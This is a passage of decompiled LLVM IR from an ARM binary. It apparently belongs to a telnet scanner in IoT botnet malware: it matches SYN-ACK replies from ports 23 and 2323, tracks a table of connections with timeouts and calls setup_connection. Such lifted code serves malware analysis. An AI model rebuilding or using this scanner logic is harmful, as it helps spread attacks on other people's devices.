  store i32 %v2_f34c, i32* %r3.global-to-local, align 4
  %v3_f350 = icmp uge i32 %v3_f348, %v2_f34c
  store i1 %v3_f350, i1* %cpsr_c.global-to-local, align 1
  %v9_f350 = icmp eq i32 %v3_f348, %v2_f34c
  store i1 %v9_f350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f350, label %dec_label_pc_f358, label %dec_label_pc_f2f0

dec_label_pc_f358:                                ; preds = %dec_label_pc_f340
  %v3_f358 = load i8, i8* %v2_f358, align 1
  %v4_f358 = zext i8 %v3_f358 to i32
  store i32 %v4_f358, i32* %r3.global-to-local, align 4
  %v2_f35c = icmp ugt i8 %v3_f358, 5
  store i1 %v2_f35c, i1* %cpsr_c.global-to-local, align 1
  %v7_f35c = icmp eq i8 %v3_f358, 6
  store i1 %v7_f35c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f35c, label %dec_label_pc_f364, label %dec_label_pc_f2f0

dec_label_pc_f364:                                ; preds = %dec_label_pc_f358
  %v0_f364 = load i32, i32* @r4, align 4
  %v1_f364 = inttoptr i32 %v0_f364 to i16*
  %v2_f364 = load i16, i16* %v1_f364, align 2
  %v3_f364 = zext i16 %v2_f364 to i32
  store i32 %v3_f364, i32* %ip.global-to-local, align 4
  %v2_f368 = icmp ugt i16 %v2_f364, 5887
  store i1 %v2_f368, i1* %cpsr_c.global-to-local, align 1
  %v7_f368 = icmp eq i16 %v2_f364, 5888
  store i1 %v7_f368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f368, label %dec_label_pc_f380, label %dec_label_pc_f370

dec_label_pc_f370:                                ; preds = %dec_label_pc_f364
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_f378 = icmp ugt i16 %v2_f364, 4872
  store i1 %v3_f378, i1* %cpsr_c.global-to-local, align 1
  %v9_f378 = icmp eq i16 %v2_f364, 4873
  store i1 %v9_f378, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f378, label %dec_label_pc_f380, label %dec_label_pc_f2f0

dec_label_pc_f380:                                ; preds = %dec_label_pc_f370, %dec_label_pc_f364
  %v1_f380 = add i32 %v0_f364, 2
  %v2_f380 = inttoptr i32 %v1_f380 to i16*
  %v3_f380 = load i16, i16* %v2_f380, align 2
  %v4_f380 = zext i16 %v3_f380 to i32
  store i32 %v4_f380, i32* %r3.global-to-local, align 4
  store i32 %v4_eea4, i32* %r2.global-to-local, align 4
  %v3_f388 = icmp uge i32 %v4_f380, %v4_eea4
  store i1 %v3_f388, i1* %cpsr_c.global-to-local, align 1
  %v9_f388 = icmp eq i32 %v4_f380, %v4_eea4
  store i1 %v9_f388, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f388, label %dec_label_pc_f390, label %dec_label_pc_f2f0

dec_label_pc_f390:                                ; preds = %dec_label_pc_f380
  %v1_f390 = add i32 %v0_f364, 13
  %v2_f390 = inttoptr i32 %v1_f390 to i8*
  %v3_f390 = load i8, i8* %v2_f390, align 1
  %v4_f390 = zext i8 %v3_f390 to i32
  store i32 %v4_f390, i32* %r3.global-to-local, align 4
  %v1_f394 = and i32 %v4_f390, 2
  %v2_f394 = icmp eq i32 %v1_f394, 0
  store i1 %v2_f394, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f394, label %dec_label_pc_f2f0, label %dec_label_pc_f39c

dec_label_pc_f39c:                                ; preds = %dec_label_pc_f390
  %v1_f39c = and i32 %v4_f390, 16
  %v2_f39c = icmp eq i32 %v1_f39c, 0
  store i1 %v2_f39c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f39c, label %dec_label_pc_f2f0, label %dec_label_pc_f3a4

dec_label_pc_f3a4:                                ; preds = %dec_label_pc_f39c
  %v1_f3a4 = and i32 %v4_f390, 4
  %v2_f3a4 = icmp eq i32 %v1_f3a4, 0
  store i1 %v2_f3a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f3a4, label %dec_label_pc_f3ac, label %dec_label_pc_f2f0

dec_label_pc_f3ac:                                ; preds = %dec_label_pc_f3a4
  %tmp = urem i8 %v3_f390, 2
  %v2_f3ac = icmp eq i8 %tmp, 0
  store i1 %v2_f3ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f3ac, label %dec_label_pc_f3b4, label %dec_label_pc_f2f0

dec_label_pc_f3b4:                                ; preds = %dec_label_pc_f3ac
  %v1_f3b4 = add i32 %v0_f364, 8
  %v2_f3b4 = inttoptr i32 %v1_f3b4 to i32*
  %v3_f3b4 = load i32, i32* %v2_f3b4, align 4
  %v3_f3bc = udiv i32 %v3_f3b4, 16777216
  %v1_f3c0 = and i32 %v3_f3b4, ptrtoint (i32* @global_var_ff00.33 to i32)
  %v1_f3b8 = udiv i32 %v3_f3b4, 256
  %v4_f3c4 = and i32 %v1_f3b8, 65280
  %v4_f3c8 = mul i32 %v1_f3c0, 256
  %v4_f3cc = mul i32 %v3_f3b4, 16777216
  %v5_f3c4 = or i32 %v4_f3cc, %v3_f3bc
  %v5_f3c8 = or i32 %v5_f3c4, %v4_f3c4
  %v5_f3cc = or i32 %v5_f3c8, %v4_f3c8
  %v1_f3d0 = add i32 %v5_f3cc, -1
  store i32 %v1_f3d0, i32* %r2.global-to-local, align 4
  %v1_f3d4 = and i32 %v1_f3d0, 16711680
  %v3_f3d8 = udiv i32 %v1_f3d0, 16777216
  %v4_f3e0 = udiv i32 %v1_f3d4, 256
  %v5_f3e0 = or i32 %v4_f3e0, %v3_f3d8
  %v1_f3dc = mul i32 %v1_f3d0, 256
  %v4_f3e4 = and i32 %v1_f3dc, 16711680
  %v5_f3e4 = or i32 %v5_f3e0, %v4_f3e4
  store i32 %v5_f3e4, i32* %r3.global-to-local, align 4
  store i32 %v2_efc0, i32* %r1.global-to-local, align 4
  %v3_f3ec = load i32, i32* %v2_f3ec, align 4
  store i32 %v3_f3ec, i32* @lr, align 4
  %v5_f3f0 = call i32 @llvm.bswap.i32(i32 %v1_f3d0)
  store i32 %v5_f3f0, i32* %r3.global-to-local, align 4
  %v3_f3f4 = icmp uge i32 %v5_f3f0, %v3_f3ec
  store i1 %v3_f3f4, i1* %cpsr_c.global-to-local, align 1
  %v9_f3f4 = icmp eq i32 %v5_f3f0, %v3_f3ec
  store i1 %v9_f3f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f3f4, label %dec_label_pc_f3fc, label %dec_label_pc_f2f0

dec_label_pc_f3fc:                                ; preds = %dec_label_pc_f3b4
  %v0_f3fc = load i32, i32* @r5, align 4
  %v3_f3fc = icmp ugt i32 %v0_f3fc, 355
  store i1 %v3_f3fc, i1* %cpsr_c.global-to-local, align 1
  %v8_f3fc = icmp eq i32 %v0_f3fc, 356
  store i1 %v8_f3fc, i1* %cpsr_z.global-to-local, align 1
  %v6_f400 = icmp slt i32 %v0_f3fc, 356
  br i1 %v6_f400, label %dec_label_pc_f404, label %dec_label_pc_f484

dec_label_pc_f404:                                ; preds = %dec_label_pc_f3fc
  store i32 ptrtoint (i32* @global_var_24f5c.154 to i32), i32* %r2.global-to-local, align 4
  %v2_f410 = load i32, i32* @global_var_24f5c.154, align 4
  store i32 %v2_f410, i32* %r1.global-to-local, align 4
  %v3_f418 = mul i32 %v0_f3fc, 388
  store i32 %v3_f418, i32* %r3.global-to-local, align 4
  %v2_f41c = add i32 %v2_f410, %v3_f418
  store i32 %v2_f41c, i32* @r0, align 4
  %v1_f420 = add i32 %v2_f41c, 12
  %v2_f420 = inttoptr i32 %v1_f420 to i32*
  %v3_f420 = load i32, i32* %v2_f420, align 4
  store i32 %v3_f420, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f424 = icmp eq i32 %v3_f420, 0
  store i1 %v2_f424, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f424, label %dec_label_pc_f46c, label %dec_label_pc_f448.preheader

dec_label_pc_f448.preheader:                      ; preds = %dec_label_pc_f404
  %v2_f428 = add i32 %v0_f3fc, 1
  %v3_f434 = mul i32 %v2_f428, 97
  %v2_f438 = and i32 %v3_f434, 1073741824
  %v3_f438 = icmp ne i32 %v2_f438, 0
  store i1 %v3_f438, i1* %cpsr_c.global-to-local, align 1
  %v4_f438 = mul i32 %v2_f428, 388
  %v3_f43c = add i32 %v2_f410, %v4_f438
  store i32 %v3_f43c, i32* %r3.global-to-local, align 4
  store i32 %v0_f3fc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f448

dec_label_pc_f448:                                ; preds = %dec_label_pc_f448.preheader, %dec_label_pc_f454
  %v0_f454 = phi i32 [ %v3_f43c, %dec_label_pc_f448.preheader ], [ %v1_f460, %dec_label_pc_f454 ]
  %v0_f448 = phi i32 [ %v0_f3fc, %dec_label_pc_f448.preheader ], [ %v1_f448, %dec_label_pc_f454 ]
  %v1_f448 = add i32 %v0_f448, 1
  store i32 %v1_f448, i32* %r2.global-to-local, align 4
  %v7_f44c = icmp eq i32 %v1_f448, 356
  br i1 %v7_f44c, label %dec_label_pc_f484.loopexit, label %dec_label_pc_f454

dec_label_pc_f454:                                ; preds = %dec_label_pc_f448
  store i32 %v0_f454, i32* @r0, align 4
  %v1_f458 = add i32 %v0_f454, 12
  %v2_f458 = inttoptr i32 %v1_f458 to i32*
  %v3_f458 = load i32, i32* %v2_f458, align 4
  %v2_f45c = icmp eq i32 %v3_f458, 0
  %v1_f460 = add i32 %v0_f454, 388
  store i32 %v1_f460, i32* %r3.global-to-local, align 4
  br i1 %v2_f45c, label %dec_label_pc_f468, label %dec_label_pc_f448

dec_label_pc_f468:                                ; preds = %dec_label_pc_f454
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f448, i32* @r5, align 4
  br label %dec_label_pc_f46c

dec_label_pc_f46c:                                ; preds = %dec_label_pc_f404, %dec_label_pc_f468
  %v1_f474 = phi i32 [ %v2_f41c, %dec_label_pc_f404 ], [ %v0_f454, %dec_label_pc_f468 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f46c = icmp eq i32 %v1_f474, 0
  store i1 %v2_f46c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f46c, label %dec_label_pc_f484, label %dec_label_pc_f474

dec_label_pc_f474:                                ; preds = %dec_label_pc_f46c
  %v2_f474 = add i32 %v1_f474, 16
  %v3_f474 = inttoptr i32 %v2_f474 to i32*
  store i32 %v3_f3ec, i32* %v3_f474, align 4
  %v0_f478 = load i32, i32* %ip.global-to-local, align 4
  %v1_f478 = trunc i32 %v0_f478 to i16
  %v2_f478 = load i32, i32* @r0, align 4
  %v3_f478 = add i32 %v2_f478, 20
  %v4_f478 = inttoptr i32 %v3_f478 to i16*
  store i16 %v1_f478, i16* %v4_f478, align 2
  %v0_f47c = call i32 @setup_connection()
  br label %dec_label_pc_f2f0

dec_label_pc_f484.loopexit:                       ; preds = %dec_label_pc_f448
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f484

dec_label_pc_f484:                                ; preds = %dec_label_pc_f3fc, %dec_label_pc_f46c, %dec_label_pc_f328, %dec_label_pc_f2f0, %dec_label_pc_f484.loopexit
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1676, i32* %ip.global-to-local, align 4
  %v2_f4a4512 = load i32, i32* @sp, align 4
  %v3_f4a4513 = add i32 %v2_f4a4512, 1676
  %v4_f4a4514 = inttoptr i32 %v3_f4a4513 to i32*
  store i32 0, i32* %v4_f4a4514, align 4
  br label %dec_label_pc_f490.dec_label_pc_f490_crit_edge

dec_label_pc_f490.dec_label_pc_f490_crit_edge:    ; preds = %dec_label_pc_f484, %dec_label_pc_f490.dec_label_pc_f490_crit_edge
  %v0_f490.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_f494 = add i32 %v0_f490.pre, 4
  store i32 %v1_f494, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f49c = add i32 %v0_f490.pre, 1672
  store i32 %v1_f49c, i32* %ip.global-to-local, align 4
  %v7_f4a0 = icmp eq i32 %v1_f494, 128
  %v2_f4a4 = load i32, i32* @sp, align 4
  %v3_f4a4 = add i32 %v2_f4a4, %v1_f49c
  %v4_f4a4 = inttoptr i32 %v3_f4a4 to i32*
  store i32 0, i32* %v4_f4a4, align 4
  br i1 %v7_f4a0, label %dec_label_pc_f4ac, label %dec_label_pc_f490.dec_label_pc_f490_crit_edge

dec_label_pc_f4ac:                                ; preds = %dec_label_pc_f490.dec_label_pc_f490_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_f4ac = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_f4ac, i32* %stack_var_-352, align 4
  %v1_f4b8515 = add i32 %v0_f4ac, 8
  store i32 %v1_f4b8515, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f4c0516 = add i32 %v0_f4ac, 1548
  store i32 %v1_f4c0516, i32* @lr, align 4
  %v7_f4c4517 = icmp eq i32 %v1_f4b8515, 128
  %v2_f4c8518 = load i32, i32* @sp, align 4
  %v3_f4c8519 = add i32 %v2_f4c8518, %v1_f4c0516
  %v4_f4c8520 = inttoptr i32 %v3_f4c8519 to i32*
  store i32 0, i32* %v4_f4c8520, align 4
  br i1 %v7_f4c4517, label %dec_label_pc_f4d0, label %dec_label_pc_f4b4.dec_label_pc_f4b4_crit_edge

dec_label_pc_f4b4.dec_label_pc_f4b4_crit_edge:    ; preds = %dec_label_pc_f4ac, %dec_label_pc_f4b4.dec_label_pc_f4b4_crit_edge
  %v0_f4b4.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_f4b8 = add i32 %v0_f4b4.pre, 4
  store i32 %v1_f4b8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f4c0 = add i32 %v0_f4b4.pre, 1544
  store i32 %v1_f4c0, i32* @lr, align 4
  %v7_f4c4 = icmp eq i32 %v1_f4b8, 128
  %v2_f4c8 = load i32, i32* @sp, align 4
  %v3_f4c8 = add i32 %v2_f4c8, %v1_f4c0
  %v4_f4c8 = inttoptr i32 %v3_f4c8 to i32*
  store i32 0, i32* %v4_f4c8, align 4
  br i1 %v7_f4c4, label %dec_label_pc_f4d0, label %dec_label_pc_f4b4.dec_label_pc_f4b4_crit_edge

dec_label_pc_f4d0:                                ; preds = %dec_label_pc_f4b4.dec_label_pc_f4b4_crit_edge, %dec_label_pc_f4ac
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_f4d0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_f4d0, i32* @r5, align 4
  store i32 %v0_f4d0, i32* @r6, align 4
  store i32 %v0_f4d0, i32* %stack_var_-52, align 4
  br label %dec_label_pc_f52c

dec_label_pc_f4e0:                                ; preds = %dec_label_pc_f560
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f54c, i1* %cpsr_z.global-to-local, align 1
  %v1_f5d0 = add i32 %v2_f544, 4
  %v2_f5d0 = inttoptr i32 %v1_f5d0 to i32*
  %v3_f5d0 = load i32, i32* %v2_f5d0, align 4
  br i1 %v7_f54c, label %dec_label_pc_f5d0, label %dec_label_pc_f4e8

dec_label_pc_f4e8:                                ; preds = %dec_label_pc_f4e0
  store i32 %v3_f5d0, i32* %ip.global-to-local, align 4
  %v3_f4ec = udiv i32 %v3_f5d0, 32
  store i32 %v2_f5dc, i32* %r1.global-to-local, align 4
  %v3_f4f4 = mul nuw nsw i32 %v3_f4ec, 4
  %v2_f4f8 = add i32 %v3_f4f4, %v2_f5dc
  store i32 %v2_f4f8, i32* %r3.global-to-local, align 4
  %v1_f4fc = add i32 %v2_f4f8, -184
  %v2_f4fc = inttoptr i32 %v1_f4fc to i32*
  %v3_f4fc = load i32, i32* %v2_f4fc, align 4
  %v1_f500 = urem i32 %v3_f5d0, 32
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_f508 = shl i32 1, %v1_f500
  %v8_f508 = or i32 %v3_f4fc, %v7_f508
  store i32 %v8_f508, i32* %r2.global-to-local, align 4
  store i32 %v8_f508, i32* %v2_f4fc, align 4
  %v0_f510 = load i32, i32* @r6, align 4
  %v1_f510 = load i32, i32* %ip.global-to-local, align 4
  %v3_f510 = icmp uge i32 %v0_f510, %v1_f510
  store i1 %v3_f510, i1* %cpsr_c.global-to-local, align 1
  %v9_f510 = icmp eq i32 %v0_f510, %v1_f510
  store i1 %v9_f510, i1* %cpsr_z.global-to-local, align 1
  %v5_f514 = icmp slt i32 %v0_f510, %v1_f510
  br i1 %v5_f514, label %bb407, label %bb408

bb407:                                            ; preds = %dec_label_pc_f4e8
  store i32 %v1_f510, i32* @r6, align 4
  br label %bb408

bb408:                                            ; preds = %.thread76, %bb414, %bb412, %bb416, %dec_label_pc_f5c4, %dec_label_pc_f4e8, %bb407
  %v3_f518 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f518, i32* %r3.global-to-local, align 4
  %v1_f51c = add i32 %v3_f518, 1
  store i32 %v1_f51c, i32* %r2.global-to-local, align 4
  %v3_f520 = icmp ugt i32 %v1_f51c, 355
  store i1 %v3_f520, i1* %cpsr_c.global-to-local, align 1
  %v8_f520 = icmp eq i32 %v1_f51c, 356
  store i1 %v8_f520, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f51c, i32* %stack_var_-52, align 4
  %v6_f528 = icmp slt i32 %v1_f51c, 356
  br i1 %v6_f528, label %dec_label_pc_f52c, label %dec_label_pc_f600

dec_label_pc_f52c:                                ; preds = %bb408, %dec_label_pc_f4d0
  %v1_f538 = phi i32 [ %v1_f51c, %bb408 ], [ %v0_f4d0, %dec_label_pc_f4d0 ]
  store i32 ptrtoint (i32* @global_var_24f5c.154 to i32), i32* @r1, align 4
  %v2_f53c = load i32, i32* @global_var_24f5c.154, align 4
  store i32 %v2_f53c, i32* %r2.global-to-local, align 4
  %v3_f540 = mul i32 %v1_f538, 388
  store i32 %v3_f540, i32* %r3.global-to-local, align 4
  %v2_f544 = add i32 %v2_f53c, %v3_f540
  store i32 %v2_f544, i32* @r4, align 4
  %v1_f548 = add i32 %v2_f544, 12
  %v2_f548 = inttoptr i32 %v1_f548 to i32*
  %v3_f548 = load i32, i32* %v2_f548, align 4
  store i32 %v3_f548, i32* %ip.global-to-local, align 4
  %v2_f54c = icmp ne i32 %v3_f548, 0
  store i1 %v2_f54c, i1* %cpsr_c.global-to-local, align 1
  %v7_f54c = icmp eq i32 %v3_f548, 1
  store i1 %v7_f54c, i1* %cpsr_z.global-to-local, align 1
  %v2_f550 = xor i1 %v2_f54c, true
  %v3_f550 = or i1 %v7_f54c, %v2_f550
  br i1 %v3_f550, label %bb409, label %bb410

bb409:                                            ; preds = %dec_label_pc_f52c
  store i32 5, i32* @r1, align 4
  br label %bb410

bb410:                                            ; preds = %dec_label_pc_f52c, %bb409
  %v1_f570215 = phi i32 [ ptrtoint (i32* @global_var_24f5c.154 to i32), %dec_label_pc_f52c ], [ 5, %bb409 ]
  %v2_f554 = xor i1 %v7_f54c, true
  %v3_f554 = and i1 %v2_f54c, %v2_f554
  br i1 %v3_f554, label %bb411, label %bb412

bb411:                                            ; preds = %bb410
  store i32 30, i32* @r1, align 4
  br label %bb412

bb412:                                            ; preds = %bb410, %bb411
  %v1_f570 = phi i32 [ %v1_f570215, %bb410 ], [ 30, %bb411 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f558 = icmp eq i32 %v3_f548, 0
  store i1 %v2_f558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f558, label %bb408, label %dec_label_pc_f560

dec_label_pc_f560:                                ; preds = %bb412
  store i32 ptrtoint (i32* @global_var_22478.143 to i32), i32* %r2.global-to-local, align 4
  %v2_f564 = load i32, i32* @global_var_22478.143, align 4
  store i32 %v2_f564, i32* %r3.global-to-local, align 4
  %v1_f568 = add i32 %v2_f544, 8
  %v2_f568 = inttoptr i32 %v1_f568 to i32*
  %v3_f568 = load i32, i32* %v2_f568, align 4
  store i32 %v3_f568, i32* %r2.global-to-local, align 4
  %v2_f56c = sub i32 %v2_f564, %v3_f568
  store i32 %v2_f56c, i32* %r3.global-to-local, align 4
  %v3_f570 = icmp uge i32 %v2_f56c, %v1_f570
  store i1 %v3_f570, i1* %cpsr_c.global-to-local, align 1
  %v9_f570 = icmp eq i32 %v2_f56c, %v1_f570
  store i1 %v9_f570, i1* %cpsr_z.global-to-local, align 1
  %v2_f574 = xor i1 %v3_f570, true
  %v3_f574 = or i1 %v9_f570, %v2_f574
  br i1 %v3_f574, label %dec_label_pc_f4e0, label %dec_label_pc_f578

dec_label_pc_f578:                                ; preds = %dec_label_pc_f560
  %v1_f578 = add i32 %v2_f544, 4
  %v2_f578 = inttoptr i32 %v1_f578 to i32*
  %v3_f578 = load i32, i32* %v2_f578, align 4
  %v1_f57c = call i32 @__GI___libc_close(i32 %v3_f578)
  %v0_f580 = load i32, i32* @r4, align 4
  %v1_f580 = add i32 %v0_f580, 12
  %v2_f580 = inttoptr i32 %v1_f580 to i32*
  %v3_f580 = load i32, i32* %v2_f580, align 4
  store i32 %v3_f580, i32* %r3.global-to-local, align 4
  %v2_f584 = icmp ugt i32 %v3_f580, 1
  store i1 %v2_f584, i1* %cpsr_c.global-to-local, align 1
  %v7_f584 = icmp eq i32 %v3_f580, 2
  store i1 %v7_f584, i1* %cpsr_z.global-to-local, align 1
  %v2_f588 = xor i1 %v2_f584, true
  %v3_f588 = or i1 %v7_f584, %v2_f588
  br i1 %v3_f588, label %bb413, label %.thread300

.thread300:                                       ; preds = %dec_label_pc_f578
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f590297301 = add i32 %v0_f580, 4
  %v3_f590298302 = inttoptr i32 %v2_f590297301 to i32*
  store i32 -1, i32* %v3_f590298302, align 4
  br label %bb414

bb413:                                            ; preds = %dec_label_pc_f578
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f590294 = add i32 %v0_f580, 4
  %v3_f590295 = inttoptr i32 %v2_f590294 to i32*
  store i32 -1, i32* %v3_f590295, align 4
  %v4_f594 = load i32, i32* %r3.global-to-local, align 4
  %v5_f594 = load i32, i32* @r4, align 4
  %v6_f594 = add i32 %v5_f594, 12
  %v7_f594 = inttoptr i32 %v6_f594 to i32*
  store i32 %v4_f594, i32* %v7_f594, align 4
  %v4_f598 = load i32, i32* %r3.global-to-local, align 4
  %v5_f598 = trunc i32 %v4_f598 to i8
  %v6_f598 = load i32, i32* @r4, align 4
  %v7_f598 = add i32 %v6_f598, 384
  %v8_f598 = inttoptr i32 %v7_f598 to i8*
  store i8 %v5_f598, i8* %v8_f598, align 1
  %v0_f59c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f59c.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb414

bb414:                                            ; preds = %.thread300, %bb413
  %v1_f59c = phi i1 [ %v1_f59c.pre, %bb413 ], [ %v2_f584, %.thread300 ]
  %v0_f59c = phi i1 [ %v0_f59c.pre, %bb413 ], [ false, %.thread300 ]
  %v2_f59c = xor i1 %v1_f59c, true
  %v3_f59c = or i1 %v0_f59c, %v2_f59c
  br i1 %v3_f59c, label %bb408, label %dec_label_pc_f5a0

dec_label_pc_f5a0:                                ; preds = %bb414
  %v0_f5a0 = load i32, i32* @r4, align 4
  %v1_f5a0 = add i32 %v0_f5a0, 384
  %v2_f5a0 = inttoptr i32 %v1_f5a0 to i8*
  %v3_f5a0 = load i8, i8* %v2_f5a0, align 1
  %v4_f5a0 = zext i8 %v3_f5a0 to i32
  %v1_f5a4 = add nuw nsw i32 %v4_f5a0, 1
  %v1_f5a8 = urem i32 %v1_f5a4, 256
  store i32 %v1_f5a8, i32* %r3.global-to-local, align 4
  %v2_f5ac = icmp ugt i32 %v1_f5a8, 9
  store i1 %v2_f5ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f5ac = icmp eq i32 %v1_f5a8, 10
  store i1 %v7_f5ac, i1* %cpsr_z.global-to-local, align 1
  %v1_f5b0 = trunc i32 %v1_f5a4 to i8
  store i8 %v1_f5b0, i8* %v2_f5a0, align 1
  %v0_f5b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f5b4, label %.thread76, label %dec_label_pc_f5c4

.thread76:                                        ; preds = %dec_label_pc_f5a0
  %v1_f5b4 = load i32, i32* %r3.global-to-local, align 4
  %v2_f5b4 = add i32 %v1_f5b4, -10
  store i32 %v2_f5b4, i32* %r3.global-to-local, align 4
  %v2_f5b8 = load i32, i32* @r4, align 4
  %v3_f5b8 = add i32 %v2_f5b8, 12
  %v4_f5b8 = inttoptr i32 %v3_f5b8 to i32*
  store i32 %v2_f5b4, i32* %v4_f5b8, align 4
  %v1_f5bc = load i32, i32* %r3.global-to-local, align 4
  %v2_f5bc = trunc i32 %v1_f5bc to i8
  %v3_f5bc = load i32, i32* @r4, align 4
  %v4_f5bc = add i32 %v3_f5bc, 384
  %v5_f5bc = inttoptr i32 %v4_f5bc to i8*
  store i8 %v2_f5bc, i8* %v5_f5bc, align 1
  %v0_f5c0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f5c0.pr.pr, label %bb408, label %dec_label_pc_f5c4

dec_label_pc_f5c4:                                ; preds = %dec_label_pc_f5a0, %.thread76
  %v0_f5c4 = load i32, i32* @r4, align 4
  store i32 %v0_f5c4, i32* @r0, align 4
  %v0_f5c8 = call i32 @setup_connection()
  br label %bb408

dec_label_pc_f5d0:                                ; preds = %dec_label_pc_f4e0
  %v3_f5d4 = udiv i32 %v3_f5d0, 32
  %v3_f5d8 = mul nuw nsw i32 %v3_f5d4, 4
  store i32 %v2_f5dc, i32* @lr, align 4
  %v2_f5e0 = add i32 %v3_f5d8, %v2_f5dc
  store i32 %v2_f5e0, i32* %r3.global-to-local, align 4
  %v1_f5e4 = add i32 %v2_f5e0, -312
  %v2_f5e4 = inttoptr i32 %v1_f5e4 to i32*
  %v3_f5e4 = load i32, i32* %v2_f5e4, align 4
  %v1_f5e8 = urem i32 %v3_f5d0, 32
  store i32 %v1_f5e8, i32* %r1.global-to-local, align 4
  %v7_f5ec = shl i32 1, %v1_f5e8
  %v8_f5ec = or i32 %v3_f5e4, %v7_f5ec
  store i32 %v8_f5ec, i32* %r2.global-to-local, align 4
  %v0_f5f0 = load i32, i32* @r5, align 4
  %v3_f5f0 = icmp uge i32 %v0_f5f0, %v3_f5d0
  store i1 %v3_f5f0, i1* %cpsr_c.global-to-local, align 1
  %v9_f5f0 = icmp eq i32 %v0_f5f0, %v3_f5d0
  store i1 %v9_f5f0, i1* %cpsr_z.global-to-local, align 1
  %v5_f5f4 = icmp slt i32 %v0_f5f0, %v3_f5d0
  br i1 %v5_f5f4, label %bb415, label %bb416

bb415:                                            ; preds = %dec_label_pc_f5d0
  store i32 %v3_f5d0, i32* @r5, align 4
  br label %bb416

bb416:                                            ; preds = %dec_label_pc_f5d0, %bb415
  store i32 %v8_f5ec, i32* %v2_f5e4, align 4
  br label %bb408

dec_label_pc_f600:                                ; preds = %bb408
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_f60c = load i32, i32* @r6, align 4
  %v1_f60c = load i32, i32* @r5, align 4
  %v3_f60c = icmp uge i32 %v0_f60c, %v1_f60c
  store i1 %v3_f60c, i1* %cpsr_c.global-to-local, align 1
  %v9_f60c = icmp eq i32 %v0_f60c, %v1_f60c
  store i1 %v9_f60c, i1* %cpsr_z.global-to-local, align 1
  %v5_f610 = icmp slt i32 %v0_f60c, %v1_f60c
  %storemerge157 = select i1 %v5_f610, i32 %v1_f60c, i32 %v0_f60c
  store i32 %v2_f624, i32* %ip.global-to-local, align 4
  store i32 %v2_f628, i32* %r1.global-to-local, align 4
  store i32 %v2_f62c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f634 = add i32 %storemerge157, 1
  %v5_f640 = call i32 @__libc_select(i32 %v1_f634, i32 %v2_f628, i32 %v2_f62c, i32 0, i32 %v2_f624)
  %v0_f644 = load i32, i32* @r4, align 4
  %v1_f648 = inttoptr i32 %v0_f644 to i32*
  %v2_f648 = call i32 @__GI_time(i32* %v1_f648)
  store i32 ptrtoint (i32* @global_var_22478.143 to i32), i32* @lr, align 4
  %v0_f650 = load i32, i32* @r4, align 4
  store i32 %v0_f650, i32* %stack_var_-52, align 4
  store i32 %v2_f648, i32* @global_var_22478.143, align 4
  br label %dec_label_pc_f658

dec_label_pc_f658:                                ; preds = %dec_label_pc_f7cc, %dec_label_pc_f600
  %v1_f664 = phi i32 [ %v1_f7d0, %dec_label_pc_f7cc ], [ %v0_f650, %dec_label_pc_f600 ]
  store i32 ptrtoint (i32* @global_var_24f5c.154 to i32), i32* %r1.global-to-local, align 4
  %v2_f668 = load i32, i32* @global_var_24f5c.154, align 4
  store i32 %v2_f668, i32* %r2.global-to-local, align 4
  %v3_f66c = mul i32 %v1_f664, 388
  store i32 %v3_f66c, i32* %r3.global-to-local, align 4
  %v2_f670 = add i32 %v2_f668, %v3_f66c
  store i32 %v2_f670, i32* @r6, align 4
  %v1_f674 = add i32 %v2_f670, 4
  %v2_f674 = inttoptr i32 %v1_f674 to i32*
  %v3_f674 = load i32, i32* %v2_f674, align 4
